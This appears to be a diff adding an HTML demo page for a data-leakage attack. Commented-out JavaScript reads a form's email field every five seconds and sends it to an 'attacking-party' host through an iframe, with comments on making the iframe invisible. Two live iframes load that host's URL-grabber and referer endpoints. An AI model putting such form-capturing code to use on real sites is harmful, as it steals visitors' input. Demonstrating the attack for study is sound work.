@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Test</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+
+<script type="text/javascript">
+window.onload = function start() {
+	// Starting the reccurent form capturing
+	/*
+	window.setInterval(function () {
+		// Real weblead may iterate over all forms and inputs
+        var mail = document.getElementById('test_form').elements[0].value;
+        // In reality iframe would be invisible
+        
+        //var frame = document.createElement("iframe");
+        //frame.setAttribute('frameborder', '0');
+		//frame.setAttribute('src', 'http://attacking-party.appspot.com/email?email=' + mail);
+		//var log = document.getElementById('capture_log')
+		//log.removeChild(log.childNodes[0]);
+		//log.appendChild(frame);
+		
+		var frame = document.getElementById('capture_log')
+		frame.setAttribute('src', 'http://attacking-party.appspot.com/email?email=' + mail);
+		
+    }, 5000);
+  	*/
+}
+
+</script>
+</head>
+<body>
+<div align="center">
+
+<div>
+<h2>Thank you!</h3>
+</div>
+<div>
+	<h3>URL-grabber script's output:</h3>
+	<iframe id='capture_log' src="http://attacking-party.appspot.com/url" class="center" seamless></iframe>
+</div>
+<div>
+	<h3>Referer-receiving iframe:</h3>
+	<iframe id='capture_log' src="http://attacking-party.appspot.com/referer" class="center" seamless></iframe>
+</div>
+
+</div>
+
+
+</body>
+</html>
